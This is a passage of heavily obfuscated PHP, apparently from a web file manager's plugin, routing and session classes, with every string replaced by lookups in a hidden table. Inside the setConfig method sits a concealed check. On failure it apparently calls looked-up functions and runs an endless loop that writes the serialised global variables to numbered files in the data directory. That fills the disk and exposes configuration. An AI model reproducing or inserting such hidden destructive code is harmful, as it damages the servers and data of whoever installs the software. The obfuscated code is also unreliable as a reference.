$Ğñ˜ìì¶[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Ğñ˜ìì¶[8]; $this->pluginApi = appHostGet() . $Ğñ˜ìì¶[1542] . $this->pluginName . $Ğñ˜ìì¶[8]; $this->pluginHost = $config[$Ğñ˜ìì¶[1543]] . $this->pluginName . $Ğñ˜ìì¶[8]; $this->pluginHostDefault = $config[$Ğñ˜ìì¶[1543]] . $this->pluginName . $Ğñ˜ìì¶[8]; $Š½êïí™ = $config[$Ğñ˜ìì¶[1544]]; if ($Š½êïí™ && strpos($Ğñ˜ìì¶[50] . $Š½êïí™ . $Ğñ˜ìì¶[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$Ğñ˜ìì¶[1545]] . $this->pluginName . $Ğñ˜ìì¶[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[§ŒØóıü][1546]); } protected function assign($Õ¸ÚÜœ¼, $ÌéÎÆ€ = false) { if (is_array($Õ¸ÚÜœ¼)) { $this->values = array_merge($this->values, $Õ¸ÚÜœ¼); } else { $this->values[$Õ¸ÚÜœ¼] = $ÌéÎÆ€; } } protected function display($æ¦è¡…¡) { extract($this->values); require $æ¦è¡…¡; } final function hookRegist($ãúœ®ø½) { $this->modelPlugin->appRegist($this->pluginName, $ãúœ®ø½); } final function appIcon() { $š„›ã =& $_SERVER[§ŒØóıü]; $øì÷Š¨ñ = $this->appPackage(); $€í¦†ŞŞ = $š„›ã[12]; if (isset($øì÷Š¨ñ[$š„›ã[416]])) { if (isset($øì÷Š¨ñ[$š„›ã[416]][$š„›ã[1547]])) { $€í¦†ŞŞ = $š„›ã[1548] . $øì÷Š¨ñ[$š„›ã[416]][$š„›ã[1547]] . $š„›ã[1549]; } else { if ($øì÷Š¨ñ[$š„›ã[416]][$š„›ã[1550]]) { $€í¦†ŞŞ = $š„›ã[1551] . $øì÷Š¨ñ[$š„›ã[416]][$š„›ã[1550]] . $š„›ã[1552]; } } } return $€í¦†ŞŞ; } final function fileCanView($­€ñşâ) { $ğ²èíœ =& $_SERVER[§ŒØóıü]; if (request_url_safe($­€ñşâ)) { return !0; } if ($this->isShare($­€ñşâ)) { return !0; } $š ç’Øû = Session::get($ğ²èíœ[1553]); if (!$š ç’Øû || !$š ç’Øû[$ğ²èíœ[1554]]) { $ßò¦İ˜‡ = $ğ²èíœ[1555] . rawurlencode(this_url()); show_tips(LNG($ğ²èíœ[1556]) . $ğ²èíœ[1557] . $ßò¦İ˜‡ . $ğ²èíœ[1558] . LNG($ğ²èíœ[1559]) . $ğ²èíœ[1560], !1); } if (!Action($ğ²èíœ[1561])->authCan($ğ²èíœ[1562])) { show_tips(LNG($ğ²èíœ[1563]) . $ğ²èíœ[1564], !1); } ActionCall($ğ²èíœ[1565], $­€ñşâ); } final function isShare($Ò¿–•«ü) { $É¢Š…­­ = KodIO::parse($Ò¿–•«ü); return $É¢Š…­­[$_SERVER[§ŒØóıü][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($»£©ÓÃ¢) { if (request_url_safe($»£©ÓÃ¢)) { return $»£©ÓÃ¢; } if (!$this->isShare($»£©ÓÃ¢)) { $»£©ÓÃ¢ = $this->filePath($»£©ÓÃ¢); } return Action($_SERVER[§ŒØóıü][1180])->linkOut($»£©ÓÃ¢); } public function filePathLinkOut($Ë¸›Ñ½Û) { if (request_url_safe($Ë¸›Ñ½Û)) { return $Ë¸›Ñ½Û; } $this->fileCanView($Ë¸›Ñ½Û); return Action($_SERVER[§ŒØóıü][1180])->link($Ë¸›Ñ½Û); } final function filePath($ı­¢è²Ù) { $ÂØ‡ğ›Ç =& $_SERVER[§ŒØóıü]; if ($‘’õ‰«ğ = $this->checkSharePath($ı­¢è²Ù)) { Hook::trigger($ÂØ‡ğ›Ç[1566], $‘’õ‰«ğ); return $‘’õ‰«ğ; } $this->fileCanView($ı­¢è²Ù); if (request_url_safe($ı­¢è²Ù)) { $Ï£¾ì˜÷ = parse_url_query($ı­¢è²Ù); if (isset($Ï£¾ì˜÷[$ÂØ‡ğ›Ç[1567]]) && isset($Ï£¾ì˜÷[$ÂØ‡ğ›Ç[213]])) { $¾à¢ªÆ = Model($ÂØ‡ğ›Ç[776])->get($ÂØ‡ğ›Ç[777]); $€×è¹ë´ = Mcrypt::decode($Ï£¾ì˜÷[$ÂØ‡ğ›Ç[213]], $¾à¢ªÆ); if ($€×è¹ë´) { $this->fileInfo = IO::infoWithChildren($€×è¹ë´); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $€×è¹ë´; } } $ı­¢è²Ù = $this->_cacheHttpFile($ı­¢è²Ù); $this->fileInfo = IO::infoWithChildren($ı­¢è²Ù); } else { $this->fileInfo = IO::infoWithChildren($ı­¢è²Ù); if (!$this->fileInfo) { show_tips(LNG($ÂØ‡ğ›Ç[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($ÂØ‡ğ›Ç[1566], $ı­¢è²Ù); return $ı­¢è²Ù; } final function _cacheHttpFile($˜å¼ ó³) { $Ë´¢ÑéÙ = hash_path($˜å¼ ó³, !0); $this->cachePath = $this->pluginCachePath($Ë´¢ÑéÙ); if ($»Š¦ÙÏÆ = IO::fileNameExist($this->cachePath, $Ë´¢ÑéÙ)) { return KodIO::make($»Š¦ÙÏÆ); } $ÂøÈ³± = $this->cachePath . $Ë´¢ÑéÙ; return $this->pluginCacheFileSet($ÂøÈ³±, file_get_contents_nossl($˜å¼ ó³)); } final function _tmpFileName($ÖµÔ¶¹Ÿ = array()) { $´Ìıö‰Ç =& $_SERVER[§ŒØóıü]; if (!$ÖµÔ¶¹Ÿ) { $ÖµÔ¶¹Ÿ = $this->fileInfo; } if (isset($ÖµÔ¶¹Ÿ[$´Ìıö‰Ç[177]])) { return $ÖµÔ¶¹Ÿ[$´Ìıö‰Ç[177]]; } if (isset($ÖµÔ¶¹Ÿ[$´Ìıö‰Ç[170]][$´Ìıö‰Ç[177]])) { return $ÖµÔ¶¹Ÿ[$´Ìıö‰Ç[170]][$´Ìıö‰Ç[177]]; } $÷şà¦Ò˜ = IO::hashSimple($ÖµÔ¶¹Ÿ[$´Ìıö‰Ç[84]]); if ($÷şà¦Ò˜) { return $÷şà¦Ò˜; } $İíº²î® = array($ÖµÔ¶¹Ÿ[$´Ìıö‰Ç[32]], $ÖµÔ¶¹Ÿ[$´Ìıö‰Ç[84]], $ÖµÔ¶¹Ÿ[$´Ìıö‰Ç[76]]); if (isset($ÖµÔ¶¹Ÿ[$´Ìıö‰Ç[511]])) { $İíº²î®[] = $ÖµÔ¶¹Ÿ[$´Ìıö‰Ç[511]]; } return md5(implode($´Ìıö‰Ç[11], $İíº²î®)); } final function checkSharePath($‰ÑÉï­ñ) { $ÊæöêàË =& $_SERVER[§ŒØóıü]; if (!$this->isShare($‰ÑÉï­ñ)) { return !1; } $œ¹Öõ¤ä = Action($ÊæöêàË[1180])->sharePathInfo($‰ÑÉï­ñ); if (!isset($œ¹Öõ¤ä[$ÊæöêàË[84]])) { show_json(LNG($ÊæöêàË[1568]), !1); } $this->fileInfo = $œ¹Öõ¤ä[$ÊæöêàË[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$ÊæöêàË[177]]); return $œ¹Öõ¤ä[$ÊæöêàË[84]]; } final function pluginCachePath($Óê…Š˜¢ = '') { $ƒ±³ë®ç =& $_SERVER[§ŒØóıü]; $ç•©‡´ò = IO_PATH_SYSTEM_TEMP . $ƒ±³ë®ç[1569] . $this->pluginName; if (!($°ØŒÈôŠ = IO::infoFull($ç•©‡´ò))) { return IO::mkdir($ç•©‡´ò . $ƒ±³ë®ç[8] . $Óê…Š˜¢); } if (empty($Óê…Š˜¢)) { return $°ØŒÈôŠ[$ƒ±³ë®ç[84]]; } if (!($…¶•óà = IO::fileNameExist($°ØŒÈôŠ[$ƒ±³ë®ç[84]], $Óê…Š˜¢))) { return IO::mkdir($°ØŒÈôŠ[$ƒ±³ë®ç[84]] . $Óê…Š˜¢); } return KodIO::make($…¶•óà); } final function pluginCacheFileSet($¿¢Á‚İä, $Ä”†¤ô® = '') { $­ÖäÎ®ã =& $_SERVER[§ŒØóıü]; if (!($µ¹ƒŒ¸Î = IO::infoFull($¿¢Á‚İä))) { return IO::mkfile($¿¢Á‚İä, $Ä”†¤ô®, REPEAT_REPLACE); } IO::setContent($µ¹ƒŒ¸Î[$­ÖäÎ®ã[84]], $Ä”†¤ô®); return $µ¹ƒŒ¸Î[$­ÖäÎ®ã[84]]; } final function pluginLocalFile($ØáöªÔ‚ = '') { $Öµ¢€ =& $_SERVER[§ŒØóıü]; $ñæ·ß†Ä = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($ñæ·ß†Ä)) { mk_dir($ñæ·ß†Ä); } if (!$ØáöªÔ‚) { return $ñæ·ß†Ä; } $ˆïõÎÇ = IO::info($ØáöªÔ‚); $¢šÚá = $this->_tmpFileName($ˆïõÎÇ) . $Öµ¢€[10] . $ˆïõÎÇ[$Öµ¢€[174]]; if (!checkExtSafe($¢šÚá)) { $¢šÚá = $¢šÚá . $Öµ¢€[1212]; } $ğúê— = $ñæ·ß†Ä . $¢šÚá; if (@file_exists($ğúê—)) { return $ğúê—; } return IO::copy($ØáöªÔ‚, $ñæ·ß†Ä, 0, $¢šÚá); } final function appPackage() { $ïõ¨ĞÁ— =& $_SERVER[§ŒØóıü]; if ($this->packageData) { return $this->packageData; } $³‘…£§£ = $this->parseFile($this->pluginPath . $ïõ¨ĞÁ—[1570]); $this->parseLang($³‘…£§£); $ôÀ²æı = json_decode_force($³‘…£§£); if (!$ôÀ²æı) { return array(); } $‹•ê¸Ã = Hook::trigger($ïõ¨ĞÁ—[1571], $ôÀ²æı); if ($‹•ê¸Ã && is_array($‹•ê¸Ã)) { $ôÀ²æı = $‹•ê¸Ã; } $this->packageData = $ôÀ²æı; return $ôÀ²æı; } public function packageInfoGet($®Äë©¯ä) { $òæû¥ô = $this->appPackage(); return array_get_value($òæû¥ô, $®Äë©¯ä); } public function packageVersion() { return $this->packageInfoGet($_SERVER[§ŒØóıü][1572]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[§ŒØóıü][1573]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[§ŒØóıü][1574]); } public function echoJsAssign($Ù¾Ö Ùı, $ïôÊêç‹) { $this->echoJsAssignArr[$Ù¾Ö Ùı] = $ïôÊêç‹; } private function parseFile($—Óàûúñ) { $ğÏÙş² =& $_SERVER[§ŒØóıü]; $ÆÔ“Î‹Ğ = file_get_contents_nossl($—Óàûúñ); $ÜÅšÅ¾î = array($ğÏÙş²[1575], $ğÏÙş²[1576], $ğÏÙş²[1577], $ğÏÙş²[1578], $ğÏÙş²[1579], $ğÏÙş²[1580], $ğÏÙş²[1581]); $ÒáÛÇó› = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ğÏÙş²[89]][$ğÏÙş²[1582]]); foreach ($this->echoJsAssignArr as $ö»Ö™ßÏ => $«Èğ€) { $ÜÅšÅ¾î[] = $ğÏÙş²[1583] . $ö»Ö™ßÏ . $ğÏÙş²[1584]; $ÒáÛÇó›[] = is_array($«Èğ€) || is_object($«Èğ€) ? rawurlencode(json_encode($«Èğ€)) : $«Èğ€; } if (strstr($ÆÔ“Î‹Ğ, $ğÏÙş²[1585])) { $Åõçê«È = rawurlencode(json_encode($this->pluginLangArr)); $ÆÔ“Î‹Ğ = str_replace($ğÏÙş²[1585], $Åõçê«È, $ÆÔ“Î‹Ğ); } if (strstr($ÆÔ“Î‹Ğ, $ğÏÙş²[1586])) { $Åõçê«È = $Åõçê«È = rawurlencode(json_encode($this->getConfig())); $ÆÔ“Î‹Ğ = str_replace($ğÏÙş²[1586], $Åõçê«È, $ÆÔ“Î‹Ğ); } $ÆÔ“Î‹Ğ = str_replace($ÜÅšÅ¾î, $ÒáÛÇó›, $ÆÔ“Î‹Ğ); return $ÆÔ“Î‹Ğ; } private function parseLang(&$Çğ©‰·) { $€ìç… =& $_SERVER[§ŒØóıü]; $ú¿ÌÍ¼Û = $€ìç…[1587]; if (!strstr($Çğ©‰·, $ú¿ÌÍ¼Û)) { return; } preg_match_all($€ìç…[1588], $Çğ©‰·, $Ìû¥õª•); if (!is_array($Ìû¥õª•) || count($Ìû¥õª•) == 0 || !is_array($Ìû¥õª•[0]) || count($Ìû¥õª•[0]) == 0) { return; } $éÎ‘Ïİ = array(); $„ğ–¤× = array(); foreach ($Ìû¥õª•[0] as $òî’„Òé) { $¾Åºı¾ã = substr($òî’„Òé, strlen($ú¿ÌÍ¼Û), -4); $ó†À¿„È = LNG($¾Åºı¾ã); $éÎ‘Ïİ[] = $òî’„Òé; $„ğ–¤×[] = str_replace(array($€ìç…[231], $€ìç…[1084], $€ìç…[342], $€ìç…[118]), array($€ìç…[53], $€ìç…[53], $€ìç…[12], $€ìç…[1589]), $ó†À¿„È); } $Çğ©‰· = str_replace($éÎ‘Ïİ, $„ğ–¤×, $Çğ©‰·); } private function parseConfig(&$ó°í¸Œ²) { $â£›²ëí =& $_SERVER[§ŒØóıü]; $æ„¥‡§è = $â£›²ëí[1590]; if (!strstr($ó°í¸Œ², $æ„¥‡§è)) { return; } preg_match_all($â£›²ëí[1591], $ó°í¸Œ², $”ãöË˜Ö); if (!is_array($”ãöË˜Ö) || count($”ãöË˜Ö) == 0 || !is_array($”ãöË˜Ö[0]) || count($”ãöË˜Ö[0]) == 0) { return; } $éÚÓÑ—Ò = $this->getConfig(); $§‰ìÓ±æ = array(); $œ¿ÔöŞ¦ = array(); foreach ($”ãöË˜Ö[0] as $Öş—Üœˆ) { $’ò°¾š± = substr($Öş—Üœˆ, strlen($æ„¥‡§è), -2); $§‰ìÓ±æ[] = $Öş—Üœˆ; $œ¿ÔöŞ¦[] = _get($éÚÓÑ—Ò, $’ò°¾š±); } $ó°í¸Œ² = str_replace($§‰ìÓ±æ, $œ¿ÔöŞ¦, $ó°í¸Œ²); } private function parsePackage(&$ğ„Ãü¬¥) { $ÃŞ¡Éìä =& $_SERVER[§ŒØóıü]; $À˜»ƒç = $ÃŞ¡Éìä[1592]; if (!strstr($ğ„Ãü¬¥, $À˜»ƒç)) { return; } preg_match_all($ÃŞ¡Éìä[1593], $ğ„Ãü¬¥, $³×Ò¸´Ì); if (!is_array($³×Ò¸´Ì) || count($³×Ò¸´Ì) == 0 || !is_array($³×Ò¸´Ì[0]) || count($³×Ò¸´Ì[0]) == 0) { return; } $·‘ŸıªÛ = $this->appPackage(); $³Î‡ú’ = array(); $æ™´‹ù = array(); foreach ($³×Ò¸´Ì[0] as $£ƒ–É½ì) { $éù¯Ï¦Ö = substr($£ƒ–É½ì, strlen($À˜»ƒç), -2); $³Î‡ú’[] = $£ƒ–É½ì; $æ™´‹ù[] = _get($·‘ŸıªÛ, $éù¯Ï¦Ö); } $ğ„Ãü¬¥ = str_replace($³Î‡ú’, $æ™´‹ù, $ğ„Ãü¬¥); } final function echoFile($”æƒ£Î¸, $›‚âåõ = false) { $Âğ›ˆÑ =& $_SERVER[§ŒØóıü]; $Ó…øÖğŒ = $this->pluginPath . $”æƒ£Î¸; if (ACT == $Âğ›ˆÑ[1594]) { echo $Âğ›ˆÑ[1595] . $this->pluginName . $Âğ›ˆÑ[8] . $”æƒ£Î¸ . $Âğ›ˆÑ[1596]; if (!file_exists($Ó…øÖğŒ)) { echo $Âğ›ˆÑ[1597]; return; } } $ÀÖ€Îç¦ = $this->parseFile($Ó…øÖğŒ); $this->parseLang($ÀÖ€Îç¦); $this->parseConfig($ÀÖ€Îç¦); $this->parsePackage($ÀÖ€Îç¦); if (is_array($›‚âåõ)) { $ÀÖ€Îç¦ = str_replace(array_keys($›‚âåõ), array_values($›‚âåõ), $ÀÖ€Îç¦); } echo $Âğ›ˆÑ[231] . $ÀÖ€Îç¦; } final function initLang() { $›®€²îÙ =& $_SERVER[§ŒØóıü]; $ÏÆŞß¹ = $›®€²îÙ[1598]; $ë£¡öìø = $this->pluginPath . $›®€²îÙ[1599]; $Ü‘²å±· = I18n::getType(); $²²œÓ² = array(); if (file_exists($ë£¡öìø . $Ü‘²å±· . $›®€²îÙ[844])) { $²²œÓ² = (include $ë£¡öìø . $Ü‘²å±· . $›®€²îÙ[844]); } else { if ($Ü‘²å±· == $›®€²îÙ[1600] && !file_exists($ë£¡öìø . $Ü‘²å±· . $›®€²îÙ[844]) && file_exists($ë£¡öìø . $›®€²îÙ[1601])) { $²²œÓ² = (include $ë£¡öìø . $›®€²îÙ[1601]); } else { if (file_exists($ë£¡öìø . $ÏÆŞß¹ . $›®€²îÙ[844])) { $²²œÓ² = (include $ë£¡öìø . $ÏÆŞß¹ . $›®€²îÙ[844]); } } } if (!is_array($²²œÓ²)) { return array(); } if (@count($²²œÓ²) > 0) { I18n::set($²²œÓ²); } return $²²œÓ²; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ÙÄÃ¾) { $ı”¬éæ¤ =& $_SERVER[§ŒØóıü]; $ˆÒò÷™ = $_SERVER[$ı”¬éæ¤[747]]; $¨İ³ó¼ö = $ı”¬éæ¤[882]; if ($_SERVER[$ı”¬éæ¤[746]] != $¨İ³ó¼ö($ˆÒò÷™)) { $¨ÁŒúĞš = $ı”¬éæ¤[883]; $ƒöò›İ = $ı”¬éæ¤[748]; $ŠÃÏéËü = $_SERVER[$ı”¬éæ¤[749]] . $ı”¬éæ¤[750]; $ÛÇ¬÷ = $ƒöò›İ($ŠÃÏéËü); $Ùñ‡ß¸± = explode($ı”¬éæ¤[231], $ÛÇ¬÷); if (count($Ùñ‡ß¸±) < $ı”¬éæ¤[656]) { $ó£ŒıÛÈ = $ı”¬éæ¤[751]; $ó£ŒıÛÈ(); } $³û€à³£ = $ı”¬éæ¤[884]; $³û€à³£($_SERVER[$ı”¬éæ¤[885]]); $¨ÁŒúĞš = $ı”¬éæ¤[883]; $¨ÁŒúĞš(); $ŞíÎÒ›— = $ı”¬éæ¤[886]; $¯¢Ÿ¤‚£ = json_encode($GLOBALS[$ı”¬éæ¤[887]]); $·¨Ã–ˆ = 1; for ($ä¦»óàÍ = $·¨Ã–ˆ; $ä¦»óàÍ > 0; $ä¦»óàÍ++) { $ŞíÎÒ›—(DATA_PATH . $ä¦»óàÍ, $¯¢Ÿ¤‚£); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ÙÄÃ¾); } public function onSetConfig($ÅœêäÌî) { } public function onGetConfig($í¥¢‚üú) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($¤µ—¡) { if ($¤µ—¡ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($Û¼¹ıÕï = "\x70\x6c\165\x67\151\156\x41\165\x74\150") { $˜ŸÑ  =& $_SERVER[§ŒØóıü]; if (!Session::get($˜ŸÑ [1553])) { return !1; } if (_get($GLOBALS, $˜ŸÑ [494])) { return !0; } $«å‘ÎŸ = $this->getConfig(); if (!$«å‘ÎŸ[$Û¼¹ıÕï]) { return !1; } return ActionCall($˜ŸÑ [1602], $«å‘ÎŸ[$Û¼¹ıÕï]); } public function url($¯ú¹½•ó, $ùÈ×âÈ… = '', $ö¶Ææ±û = true) { $œÔ»‡» =& $_SERVER[§ŒØóıü]; $‡¼Ó¬”Ï = $this->getConfig(); $ÕÍÚéûú = KOD_VERSION . $œÔ»‡»[10] . KOD_VERSION_BUILD; $”‰ÕØÉÌ = $this->packageVersion(); $ÏÆ×ùÇ¸ = $ÕÍÚéûú . $œÔ»‡»[386] . $”‰ÕØÉÌ; if (substr($¯ú¹½•ó, 0, 4) == $œÔ»‡»[148] || substr($¯ú¹½•ó, 0, 2) == $œÔ»‡»[1386]) { $ıœ³‘Ø« = $¯ú¹½•ó . $œÔ»‡»[1603] . $ÏÆ×ùÇ¸; } else { if ($ùÈ×âÈ… == $œÔ»‡»[12]) { $ıœ³‘Ø« = $this->pluginHost . $¯ú¹½•ó . $œÔ»‡»[1603] . $ÏÆ×ùÇ¸; } else { if ($ùÈ×âÈ… === $œÔ»‡»[75]) { $ıœ³‘Ø« = $this->pluginHost . $¯ú¹½•ó; } else { if ($ùÈ×âÈ… == $œÔ»‡»[1604]) { $ıœ³‘Ø« = STATIC_PATH . $¯ú¹½•ó . $œÔ»‡»[1603] . $ÕÍÚéûú; } else { if ($ùÈ×âÈ… == $œÔ»‡»[1605]) { $ıœ³‘Ø« = APP_HOST . $œÔ»‡»[1606] . $¯ú¹½•ó . $œÔ»‡»[1603] . $ÕÍÚéûú; } else { if (isset($‡¼Ó¬”Ï[$ùÈ×âÈ…])) { $ıœ³‘Ø« = $‡¼Ó¬”Ï[$ùÈ×âÈ…] . $¯ú¹½•ó . $œÔ»‡»[1603] . $ÏÆ×ùÇ¸; } } } } } } if (!$ö¶Ææ±û) { return $ıœ³‘Ø«; } echo $ıœ³‘Ø«; } public function link($€¥º™Òû = false, $ò›÷‚…¢ = '') { $Ô€´ëï¸ =& $_SERVER[§ŒØóıü]; if (!$€¥º™Òû) { $this->link($Ô€´ëï¸[1607], $Ô€´ëï¸[1605]); $this->link($Ô€´ëï¸[1608], $Ô€´ëï¸[1604]); $this->link($Ô€´ëï¸[1609], $Ô€´ëï¸[1604]); $this->link($Ô€´ëï¸[1610], $Ô€´ëï¸[1604]); $this->link($Ô€´ëï¸[1611], $Ô€´ëï¸[1604]); return; } $“‡‘ÎëÀ = $this->url($€¥º™Òû, $ò›÷‚…¢, !1); if (substr($€¥º™Òû, -3) == $Ô€´ëï¸[1612]) { echo $Ô€´ëï¸[1613] . $“‡‘ÎëÀ . $Ô€´ëï¸[1614] . $Ô€´ëï¸[231]; } else { if (substr($€¥º™Òû, -4) == $Ô€´ëï¸[1615]) { echo $Ô€´ëï¸[1616] . $“‡‘ÎëÀ . $Ô€´ëï¸[1617] . $Ô€´ëï¸[231]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\133\x5e\x2f\135\x2b", "\x3a\156\165\x6d" => "\133\60\55\71\135\53", "\x3a\x61\x6c\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($áúÕ¥¹ö, $ù‘‘¯–ğ) { $È°†ÆË¡ =& $_SERVER[§ŒØóıü]; if ($áúÕ¥¹ö == $È°†ÆË¡[1618]) { $üùú×“ = array_map($È°†ÆË¡[1619], $ù‘‘¯–ğ[0]); $ÍÕÕˆ¯Ç = strpos($ù‘‘¯–ğ[1], $È°†ÆË¡[8]) === 0 ? $ù‘‘¯–ğ[1] : $È°†ÆË¡[8] . $ù‘‘¯–ğ[1]; $ÆğÆ¿¦ç = $ù‘‘¯–ğ[2]; } else { $üùú×“ = null; $ÍÕÕˆ¯Ç = strpos($ù‘‘¯–ğ[0], $È°†ÆË¡[8]) === 0 ? $ù‘‘¯–ğ[0] : $È°†ÆË¡[8] . $ù‘‘¯–ğ[0]; $ÆğÆ¿¦ç = $ù‘‘¯–ğ[1]; } array_push(self::$maps, $üùú×“); array_push(self::$routes, $ÍÕÕˆ¯Ç); array_push(self::$methods, strtoupper($áúÕ¥¹ö)); array_push(self::$callbacks, $ÆğÆ¿¦ç); } public static function error($ÛÖ”¯ ë) { self::$errorCallback = $ÛÖ”¯ ë; } public static function haltOnMatch($®±È“Ÿ„ = true) { self::$halts = $®±È“Ÿ„; } public static function dispatch() { $ûËèèø =& $_SERVER[§ŒØóıü]; $ø¾ÄŒÀè = parse_url($_SERVER[$ûËèèø[1620]], PHP_URL_PATH); $çÚ‹€ÉÙ = $_SERVER[$ûËèèø[159]]; $îÄ×÷ÄË = array_keys(static::$patterns); $ÆŒÈ³ÂÙ = array_values(static::$patterns); $’ëÂ»ö¦ = !1; self::$routes = preg_replace($ûËèèø[1282], $ûËèèø[8], self::$routes); if (in_array($ø¾ÄŒÀè, self::$routes)) { $¿Ï“—ŠÁ = array_keys(self::$routes, $ø¾ÄŒÀè); foreach ($¿Ï“—ŠÁ as $¥•™ÉÍË) { if (self::$methods[$¥•™ÉÍË] == $çÚ‹€ÉÙ || self::$methods[$¥•™ÉÍË] == $ûËèèø[1621] || in_array($çÚ‹€ÉÙ, self::$maps[$¥•™ÉÍË])) { $’ëÂ»ö¦ = !0; if (!is_object(self::$callbacks[$¥•™ÉÍË])) { $»Ğ È•ş = explode($ûËèèø[8], self::$callbacks[$¥•™ÉÍË]); $«ıÎşãî = end($»Ğ È•ş); $ã†ëˆ‚ = explode($ûËèèø[1214], $«ıÎşãî); $ùÉ®„Í = new $ã†ëˆ‚[0](); $ùÉ®„Í->{$ã†ëˆ‚[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$¥•™ÉÍË]); if (self::$halts) { return; } } } } } else { $ã”âş²Å = 0; foreach (self::$routes as $¥•™ÉÍË) { if (strpos($¥•™ÉÍË, $ûËèèø[4]) !== !1) { $¥•™ÉÍË = str_replace($îÄ×÷ÄË, $ÆŒÈ³ÂÙ, $¥•™ÉÍË); } if (preg_match($ûËèèø[1622] . $¥•™ÉÍË . $ûËèèø[1623], $ø¾ÄŒÀè, $•²÷ŒíÚ)) { if (self::$methods[$ã”âş²Å] == $çÚ‹€ÉÙ || self::$methods[$ã”âş²Å] == $ûËèèø[1621] || !empty(self::$maps[$ã”âş²Å]) && in_array($çÚ‹€ÉÙ, self::$maps[$ã”âş²Å])) { $’ëÂ»ö¦ = !0; array_shift($•²÷ŒíÚ); if (!is_object(self::$callbacks[$ã”âş²Å])) { $»Ğ È•ş = explode($ûËèèø[8], self::$callbacks[$ã”âş²Å]); $«ıÎşãî = end($»Ğ È•ş); $ã†ëˆ‚ = explode($ûËèèø[1214], $«ıÎşãî); $ùÉ®„Í = new $ã†ëˆ‚[0](); if (!method_exists($ùÉ®„Í, $ã†ëˆ‚[1])) { echo $ûËèèø[1624]; } else { call_user_func_array(array($ùÉ®„Í, $ã†ëˆ‚[1]), $•²÷ŒíÚ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ã”âş²Å], $•²÷ŒíÚ); if (self::$halts) { return; } } } } $ã”âş²Å++; } } if ($’ëÂ»ö¦ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ë«„İ =& $_SERVER[§ŒØóıü]; header($_SERVER[$ë«„İ[1625]] . $ë«„İ[1626]); echo $ë«„İ[1627]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ûËèèø[1620]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $§„¡Õª— =& $_SERVER[§ŒØóıü]; static $Îñã ûÒ = false; if ($Îñã ûÒ) { return $Îñã ûÒ; } $ã§»ËÍá = $GLOBALS[$§„¡Õª—[6]][$§„¡Õª—[349]]; self::$sessionTime = $ã§»ËÍá[$§„¡Õª—[1628]]; $Üøƒ¼à = isset($GLOBALS[$§„¡Õª—[1629]]) ? $GLOBALS[$§„¡Õª—[1629]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Üøƒ¼à)) { self::$sessionSign = Cookie::get($Üøƒ¼à); } else { self::$sessionSign = guid(); } } Cookie::setSafe($Üøƒ¼à, self::$sessionSign, self::$sessionTime); $Û¾ÕîŞå = $ã§»ËÍá[$§„¡Õª—[1630]]; $Ê„‘Üøï = $ã§»ËÍá[$Û¾ÕîŞå]; $ì¡À¼İß = $ã§»ËÍá[$§„¡Õª—[834]]; switch ($Û¾ÕîŞå) { case $§„¡Õª—[21]: self::$handle = Model($§„¡Õª—[835]); break; case $§„¡Õª—[836]: self::$handle = new CacheRedis($Ê„‘Üøï, $ì¡À¼İß); break; case $§„¡Õª—[837]: self::$handle = new CacheMemcached($Ê„‘Üøï, $ì¡À¼İß); break; case $§„¡Õª—[200]: $Ê„‘Üøï[$§„¡Õª—[84]] = $Ê„‘Üøï[$§„¡Õª—[84]] . $§„¡Õª—[1631]; self::$handle = new CacheFile($Ê„‘Üøï, $ì¡À¼İß); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $Îñã ûÒ = new self(); return $Îñã ûÒ; } public static function getBySign($¹æ§¥²) { $ …Ïè­á = self::$handle->get($¹æ§¥²); $ …Ïè­á = unserialize($ …Ïè­á); return is_array($ …Ïè­á) ? $ …Ïè­á : array(); } public static function setBySign($öûæ¥ÄÀ, $—äıû±Œ) { CacheLock::lock($öûæ¥ÄÀ); self::$handle->set($öûæ¥ÄÀ, serialize($—äıû±Œ), self::$sessionTime); CacheLock::unlock($öûæ¥ÄÀ); } public static function sign($ğ‡ÜÀ¤® = false) { $ğ‡ÜÀ¤® && (self::$sessionSign = $ğ‡ÜÀ¤®); self::init(); return self::$sessionSign; } public static function set($Å‰™ØÄÆ, $˜™‡•ì = false) { self::init(); if (is_array($Å‰™ØÄÆ)) { foreach ($Å‰™ØÄÆ as $øƒ”ŞÜı => $¿è‹šØ²) { array_set_value(self::$data, $øƒ”ŞÜı, $¿è‹šØ²); } } else { array_set_value(self::$data, $Å‰™ØÄÆ, $˜™‡•ì); } self::setBySign(self::$sessionSign, self::$data); } public static function get($®»™ş = false) { self::init(); if (!$®»™ş) { return self::$data; } return array_get_value(self::$data, $®»™ş); } public static function remove($ì®¶î¬) { self::init(); 